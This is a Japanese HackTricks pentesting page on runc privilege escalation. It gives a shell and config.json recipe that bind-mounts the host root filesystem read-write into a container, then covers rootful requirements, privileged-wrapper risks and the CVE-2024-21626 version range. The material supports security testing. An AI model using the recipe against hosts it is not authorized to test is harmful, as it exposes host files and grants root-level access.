# RunC 権限昇格

{{#include ../../banners/hacktricks-training.md}}

## 基本情報

**runc** について詳しく知りたい場合は、以下のページを参照してください。

{{#ref}}
../../network-services-pentesting/2375-pentesting-docker.md
{{#endref}}

## PE

ホスト上の rootful プロセスから `runc` を利用できる場合、マウント設定でホストの `/` をコンテナ内の `/` に再帰的に bind-mount する OCI bundle を使用すると、そのマウント名前空間内にホストのファイルシステムを公開できます。<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>

```bash
runc -help #Get help and see if runc is intalled
runc spec #This will create the config.json file in your current folder

Inside the "mounts" section of the create config.json add the following lines:
{
    "type": "bind",
    "source": "/",
    "destination": "/",
    "options": [
        "rbind",
        "rw",
        "rprivate"
    ]
},

#Once you have modified the config.json file, create the folder rootfs in the same directory
mkdir rootfs

# Finally, start the container
# The root folder is the one from the host
runc run demo
```

> [!CAUTION]
> ドキュメントに記載されている `runc run` のワークフローは rootful です。runc 自身の例でも「run as root」とされています。非特権ユーザーには `runc spec --rootless` などの rootless 設定が必要で、このモードでは user namespace を有効にする必要があると runc のドキュメントに記載されています。<sup>[[1]](#references)</sup>

## 特権 wrapper とランタイムのバージョン

呼び出し元が制御する OCI bundle を受け入れる特権 wrapper は、安全でない bind mount を許可するとホスト上のファイルを露出させる可能性があります。mount の source と destination を検証する前に、wrapper がパストラバーサルやシンボリックリンクを解決するか、また `process.cwd` を制限しているかを確認してください。sudo ルールや書き込み可能な `config.json` があるだけでは、その wrapper が bundle を受け入れることや、ホスト権限で実行することの証明にはなりません。

別件として、[CVE-2024-21626](https://github.com/opencontainers/runc/security/advisories/GHSA-xr7r-f8xq-vfvv) は upstream の `runc` バージョン `1.0.0-rc93` から `1.1.11` に影響し、`1.1.12` には upstream の修正が含まれています。特定の `runc run` または `runc exec` ワークフローでは、Leaked file descriptor と不十分な作業ディレクトリの検証により、コンテナプロセスが root の外側に置かれる可能性がありました。file descriptor 番号は呼び出し方法によって異なります。また、vendor が修正を backport している場合や、呼び出し元が特権ランタイムの呼び出しに影響を与えられない場合、バージョン文字列だけでは悪用可能性を判断できません。

## References

- [1] [runc: コンテナを生成・実行する CLI ツール](https://github.com/opencontainers/runc#using-runc)
- [2] [OCI Runtime Specification: Mounts](https://github.com/opencontainers/runtime-spec/blob/main/config.md#mounts)
- [3] [Shared Subtrees](https://docs.kernel.org/filesystems/sharedsubtree.html)
{{#include ../../banners/hacktricks-training.md}}
